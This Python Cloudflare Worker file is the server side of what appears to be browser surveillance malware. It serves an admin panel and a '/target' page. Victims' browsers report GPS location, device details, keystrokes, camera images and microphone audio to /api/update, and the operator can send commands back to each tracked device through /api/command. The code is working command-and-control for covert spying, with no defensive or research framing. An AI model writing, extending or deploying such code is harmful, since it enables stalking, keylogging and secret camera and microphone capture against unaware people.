from workers import WorkerEntrypoint, Response
from pathlib import Path
from urllib.parse import urlparse
import json

clients = {}

class Default(WorkerEntrypoint):
    async def fetch(self, request):
        global clients
        url = urlparse(request.url)
        path = url.path.rstrip("/")

        cors_headers = {
            "Access-Control-Allow-Origin": "*",
            "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
            "Access-Control-Allow-Headers": "Content-Type",
        }

        if path in ("", "/") and request.method == "GET":
            admin_file = Path(__file__).parent / "templates" / "admin.html"
            return Response(admin_file.read_text(encoding="utf-8"), headers={"Content-Type": "text/html; charset=utf-8"})

        if path == "/target" and request.method == "GET":
            target_file = Path(__file__).parent / "templates" / "target.html"
            return Response(target_file.read_text(encoding="utf-8"), headers={"Content-Type": "text/html; charset=utf-8"})

        if path == "/api/update" and request.method == "POST":
            try:
                data = await request.json()
                client_id = data.get("id", "unknown_device")
                
                if "camera_image" in data or "audio_data" in data:
                    if client_id in clients:
                        if "camera_image" in data:
                            clients[client_id]["camera_image"] = data["camera_image"]
                            clients[client_id]["camera_time"] = data.get("time", "")
                        if "audio_data" in data:
                            clients[client_id]["audio_data"] = data["audio_data"]
                            clients[client_id]["audio_time"] = data.get("time", "")
                        clients[client_id]["command"] = None
                elif "keystrokes" in data:
                    if client_id not in clients:
                        clients[client_id] = {}
                    clients[client_id]["keystrokes"] = data["keystrokes"]
                else:
                    if client_id not in clients:
                        clients[client_id] = {}
                    clients[client_id].update({
                        "id": client_id,
                        "lat": data.get("lat"),
                        "lng": data.get("lng"),
                        "accuracy": data.get("accuracy", 0),
                        "device": data.get("device", "Unknown"),
                        "browser": data.get("browser", "Unknown"),
                        "battery": data.get("battery", "N/A"),
                        "charging": data.get("charging", "N/A"),
                        "lastSeen": data.get("time", "")
                    })
                return Response(json.dumps({"status": "success"}), headers={**cors_headers, "Content-Type": "application/json"})
            except Exception as e:
                return Response(json.dumps({"error": str(e)}), status=400, headers={**cors_headers, "Content-Type": "application/json"})

        if path == "/api/clients" and request.method == "GET":
            return Response(json.dumps(clients), headers={**cors_headers, "Content-Type": "application/json"})

        if path == "/api/command" and request.method == "POST":
            try:
                data = await request.json()
                client_id = data.get("client_id")
                command = data.get("command")
                if client_id in clients:
                    clients[client_id]["command"] = command
                    return Response(json.dumps({"status": "success"}), headers={**cors_headers, "Content-Type": "application/json"})
                return Response(json.dumps({"error": "Device not found"}), status=404, headers={**cors_headers, "Content-Type": "application/json"})
            except Exception as e:
                return Response(json.dumps({"error": str(e)}), status=400, headers={**cors_headers, "Content-Type": "application/json"})

        if request.method == "OPTIONS":
            return Response("", headers=cors_headers)

        return Response("Not found", status=404)
